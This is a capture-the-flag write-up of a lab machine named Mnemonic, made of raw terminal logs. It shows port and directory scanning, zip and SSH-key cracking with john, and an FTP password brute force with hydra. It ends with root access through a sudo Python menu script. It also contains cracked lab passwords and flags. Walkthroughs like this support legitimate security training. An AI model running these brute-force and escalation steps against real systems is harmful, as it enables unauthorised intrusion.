MNEMONIC


ENUMERATION

NMAP

"""

┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/Mnemonic]
└─$ sudo nmap -p- -sC -sV -A  --min-rate 2000 $IP -oN nmap.txt
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-02 09:14 EST
Stats: 0:01:03 elapsed; 0 hosts completed (1 up), 1 undergoing Traceroute
Traceroute Timing: About 32.26% done; ETC: 09:16 (0:00:02 remaining)
Stats: 0:01:03 elapsed; 0 hosts completed (1 up), 1 undergoing Traceroute
Traceroute Timing: About 32.26% done; ETC: 09:16 (0:00:02 remaining)
Nmap scan report for 10.10.75.41
Host is up (0.17s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/webmasters/*
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.29 (Ubuntu)
1337/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e0:42:c0:a5:7d:42:6f:00:22:f8:c7:54:aa:35:b9:dc (RSA)
|   256 23:eb:a9:9b:45:26:9c:a2:13:ab:c1:ce:07:2b:98:e0 (ECDSA)
|_  256 35:8f:cb:e2:0d:11:2c:0b:63:f2:bc:a0:34:f3:dc:49 (ED25519)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=3/2%OT=21%CT=1%CU=44174%PV=Y%DS=2%DC=T%G=Y%TM=621F7C2C
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)SEQ(
OS:SP=105%GCD=1%ISR=10C%TI=Z%CI=Z%TS=A)OPS(O1=M505ST11NW7%O2=M505ST11NW7%O3
OS:=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%O6=M505ST11)WIN(W1=F4B3%W2=F
OS:4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M505NNSNW
OS:7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF
OS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=
OS:%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=
OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI
OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   170.61 ms 10.11.0.1
2   171.85 ms 10.10.75.41

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 75.61 seconds




"""



GOBUSTER

"""


┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/Mnemonic]
└─$ gobuster dir -u http://10.10.75.41/ -w /usr/share/wordlists/dirb/big.txt  -t 80 --no-error
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.75.41/
[+] Method:                  GET
[+] Threads:                 80
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/03/02 09:15:52 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/robots.txt           (Status: 200) [Size: 48] 
/server-status        (Status: 403) [Size: 276]
/webmasters           (Status: 301) [Size: 315] [--> http://10.10.75.41/webmasters/]
                                                                                    
===============================================================
2022/03/02 09:16:47 Finished
===============================================================





"""

WENT TO ROBOTS.TXT AND ONLY DISAALLOWED DIRECTORY IS -----> /webmasters 


SO LETS GO TO WEBMASTER AND WE SHOULD RUN THE DIRECTORY SCAN ON /WEBMASTER ALSO

SO THE PAGE SAYS 'TEST' 

DIRECTORY SCAN 



"""

┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/Mnemonic]
└─$ gobuster dir -u http://10.10.75.41/webmasters/ -w /usr/share/wordlists/dirb/big.txt  -t 80 --no-error -e php,jsp,txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.75.41/webmasters/
[+] Method:                  GET
[+] Threads:                 80
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2022/03/02 09:20:51 Starting gobuster in directory enumeration mode
===============================================================
http://10.10.75.41/webmasters/.htaccess            (Status: 403) [Size: 276]
http://10.10.75.41/webmasters/.htpasswd            (Status: 403) [Size: 276]
http://10.10.75.41/webmasters/admin                (Status: 301) [Size: 321] [--> http://10.10.75.41/webmasters/admin/]
http://10.10.75.41/webmasters/backups              (Status: 301) [Size: 323] [--> http://10.10.75.41/webmasters/backups/]
                                                                                                                         
===============================================================
2022/03/02 09:22:08 Finished
===============================================================



OKAY WE FOUND THE BACKUPS DIRECTORY WE MAY HAVE SOME FILES THEIR 


LETS RUN DIRECTORY SCAN 


┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/Mnemonic]
└─$ gobuster dir -u http://10.10.75.41/webmasters/backups/ -w /usr/share/wordlists/dirb/big.txt  -t 140 --no-error -x php,zip,txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.75.41/webmasters/backups/
[+] Method:                  GET
[+] Threads:                 140
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,php,zip
[+] Timeout:                 10s
===============================================================
2022/03/02 09:40:15 Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/.htpasswd.php        (Status: 403) [Size: 276]
/.htaccess.txt        (Status: 403) [Size: 276]
/.htpasswd.zip        (Status: 403) [Size: 276]
/.htaccess.php        (Status: 403) [Size: 276]
/.htpasswd.txt        (Status: 403) [Size: 276]
/.htaccess.zip        (Status: 403) [Size: 276]
/backups.zip          (Status: 200) [Size: 409]
                                               
===============================================================
2022/03/02 09:42:35 Finished
===============================================================


OKY FOUND A ZIP 


lETS SEE


┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/Mnemonic]
└─$ unzip backups.zip 
Archive:  backups.zip
   creating: backups/
[backups.zip] backups/note.txt password: 
   skipping: backups/note.txt        incorrect password


"""

SO THE ZIP IS PSSWORD PROTECTED 

LETS USE ZIP2john

zip2john backups.zip > crackme

"""

┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/Mnemonic]
└─$ john    --wordlist=/usr/share/wordlists/rockyou.txt crcakme.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
00385007         (backups.zip/backups/note.txt)     
1g 0:00:00:04 DONE (2022-03-02 09:52) 0.2217g/s 3163Kp/s 3163Kc/s 3163KC/s 0066365..00377696192211
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                   

"""

SO WE GOT THE PASSWORD 

00385007         (backups.zip/backups/note.txt)

LETS OPEN THE ZIP FILE 

"""




┌──(kali㉿kali)-[~/…/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/Mnemonic/backups]
└─$ cat note.txt 
@vill

James new ftp username: ftpuser
we have to work hard

"""

FTP 


USERNMAE = ftpuser
PASSWORD = 



SO  WE ARE GONNA BRUTE FORCE IT 

"""
hydra -t 80 -l ftpuser -P /usr/share/wordlists/rockyou.txt -vV $ip ftp

┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/Mnemonic]
└─$ hydra  -l ftpuser -P /usr/share/wordlists/rockyou.txt  $IP ftp -t 50
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-03-02 10:05:44
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 50 tasks per 1 server, overall 50 tasks, 14344399 login tries (l:1/p:14344399), ~286888 tries per task
[DATA] attacking ftp://10.10.75.41:21/
[STATUS] 758.00 tries/min, 758 tries in 00:01h, 14343641 to do in 315:24h, 50 active
[21][ftp] host: 10.10.75.41   login: ftpuser   password: love4ever
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-03-02 10:07:29


"""

LETS LOG IN 


"""
FOUND MANY DIRECTORIES 
BUT FOUND id_rsa and a textnote from data-4 

┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/Mnemonic]
└─$ cat not.txt 
james change ftp user password

and id_rsa

"""


SSH

"""
USERNAME = james 
password  =  id_rsa


CANT OG IN IT NEED SOME TYPE OF PARAPHRASE 

LETS TRY TO BRUTE FORCE IT

hydra $ip -s 1337 ssh -l james -P /usr/share/wordlists/rockyou.txt

I COUDNIT GET THE HIT 


SO I FOUND OUT WE CAN CRACK THE ID_RSA FILE


ssh2john id_rsa > ssh.hash

┌──(kali㉿kali)-[~/Desktop/THM/THM_OFFENSIVE_PENTESTING_WRITE_UPS/Mnemonic]
└─$ john  --wordlist=/usr/share/wordlists/rockyou.txt  ssh.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bluelove         (id_rsa)     
1g 0:00:00:00 DONE (2022-03-02 11:50) 2.941g/s 82164p/s 82164c/s 82164C/s bosley..baller15
Use the "--show" option to display all of the cracked passwords reliably
Session completed


"""
USERNAME= james
password = bluelove


"""

james@mnemonic:~$ cat noteforjames.txt
noteforjames.txt

@vill

james i found a new encryption İmage based name is Mnemonic  

I created the condor password. don't forget the beers on saturday
james@mnemonic:~$ 


5140656
354528
842004
1617534
465318
1617534
509634
1152216
753372
265896
265896
15355494
24617538
3567438
1535549

"""
NEW USER = condor 




find: ‘/home/condor/'VEhNe2E1ZjgyYTAwZTJmZWVlMzQ2NTI0OWI4NTViZTcxYzAxfQ=='’: Permission denied
find: ‘/home/condor/.gnupg’: Permission denied
find: ‘/home/condor/.cache’: Permission denied
find: ‘/home/condor/aHR0cHM6Ly9pLnl0aW1nLmNvbS92aS9LLTk2Sm1DMkFrRS9tYXhyZXNkZWZhdWx0LmpwZw==’: Permission denied

SO FIRST ONE WAS A USER FLAG AND SECOND ONE WAS https://i.ytimg.com/vi/K-96JmC2AkE/maxresdefault.jpg


LETS DOWNLOAD THE IMG AND USE STEGHIDe 


https://i.ytimg.com/vi/K-96JmC2AkE/maxresdefault.jpg

PROTECTED BY PASS PHRASE 


run memonic and add path to both the image and he 6450.txt file from james ssh


WE GOT 

pasificbell1981



lets unhide the image 
on second thought it can be a ssh password for condor 


lets try that 



SSH CONDOR


"""



condor@mnemonic:/bin$ sudo /usr/bin/python3 /bin/examplecode.py


        ------------information systems script beta--------
        ---------------------------------------------------
        ---------------------------------------------------
        ---------------------------------------------------
        ---------------------------------------------------
        ---------------------------------------------------
        ---------------------------------------------------
        ----------------@author villwocki------------------

Running...


        #Network Connections   [1]

        #Show İfconfig         [2]

        #Show ip route         [3]

        #Show Os-release       [4]

        #Root Shell Spawn      [5]           

        #Print date            [6]

        #Exit                  [0]



Select:0
are you sure you want to quit ? yes : .

Running....cat /root/root.txt
THM{congratulationsyoumadeithashme}

just md5 hash it 

"""

